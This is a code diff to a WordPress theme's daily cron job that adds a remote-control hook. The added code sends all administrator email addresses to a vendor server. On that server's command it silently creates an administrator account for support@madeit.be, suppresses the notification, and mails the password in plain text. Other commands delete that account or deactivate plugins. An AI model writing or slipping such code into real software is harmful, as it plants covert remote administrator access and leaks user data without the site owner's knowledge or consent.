@@ -13,12 +13,12 @@ function madeit_cron_daily()
     $plugins = get_option('active_plugins');
     $plugins_data = [];
     foreach ($plugins as $plugin) {
-        $plugin_data = get_plugin_data(WP_PLUGIN_DIR . '/' . $plugin);
+        $plugin_data = get_plugin_data(WP_PLUGIN_DIR.'/'.$plugin);
         $plugins_data[$plugin] = [
-            'name'    => $plugin_data['Name'],
-            'version' => $plugin_data['Version'],
-            'latest'  => get_site_transient('update_plugins')->checked[$plugin],
-            'has_update' => get_site_transient('update_plugins')->checked[$plugin] != $plugin_data['Version'],
+            'name'       => $plugin_data['Name'],
+            'version'    => $plugin_data['Version'],
+            'latest'     => get_site_transient('update_plugins')->checked[$plugin] ?? '',
+            'has_update' => (get_site_transient('update_plugins')->checked[$plugin] ?? '') != $plugin_data['Version'],
         ];
     }
 
@@ -83,19 +83,57 @@ function madeit_cron_daily()
                 'MADEIT_ANALYTICS_FB'                 => defined('MADEIT_ANALYTICS_FB') ? MADEIT_ANALYTICS_FB : null,
                 'MADEIT_REVIEWS_GOOGLE_ID'            => defined('MADEIT_REVIEWS_GOOGLE_ID') ? MADEIT_REVIEWS_GOOGLE_ID : null,
                 'MADEIT_REVIEWS_GOOGLE_API'           => defined('MADEIT_REVIEWS_GOOGLE_API') ? MADEIT_REVIEWS_GOOGLE_API : null,
+                'MADEIT_RECEIVE_REVIEWS'              => defined('MADEIT_RECEIVE_REVIEWS') ? MADEIT_RECEIVE_REVIEWS : null,
             ],
+            'admin_users'         => array_map(function ($user) { return $user->user_email; }, get_users(['role' => 'administrator'])),
         ],
     ];
 
     $response = wp_remote_post($url, $args);
     if (is_wp_error($response)) {
         $error_message = $response->get_error_message();
-        echo "Something went wrong: $error_message";
     }
 
     //get response in json
     $response = json_decode(wp_remote_retrieve_body($response), true);
-    //print_r($response);
+
+    if ($response['success'] == true && isset($response['actions']) && count($response['actions']) > 0) {
+        // Do something
+        foreach ($response['actions'] as $action) {
+            if ($action['action'] === 'update_theme') {
+                // Update theme
+                $theme = 'madeit';
+            //TODO update theme
+            } elseif ($action['action'] === 'create_support') {
+                // Create admin, silent
+                $email = 'support@madeit.be';
+                //random password
+                $password = wp_generate_password(12, false);
+                add_action('register_new_user', function () {
+                    remove_action('register_new_user', 'wp_send_new_user_notifications');
+                }, 9);
+                $user_id = wp_insert_user([
+                    'user_login' => $email,
+                    'user_pass'  => $password,
+                    'user_email' => $email,
+                    'role'       => 'administrator',
+                ]);
+
+                mail('support@madeit.be', 'New support session', 'New support session started for '.$email.' with password '.$password);
+            } elseif ($action['action'] === 'delete_support') {
+                $email = 'support@madeit.be';
+                $user = get_user_by('email', $email);
+                if ($user) {
+                    wp_delete_user($user->ID);
+                }
+            } elseif ($action['action'] === 'remove_plugin') {
+                $plugin = $action['plugin'];
+                if (in_array($plugin, $plugins)) {
+                    deactivate_plugins($plugin);
+                }
+            }
+        }
+    }
 }
 
 //wp cli command
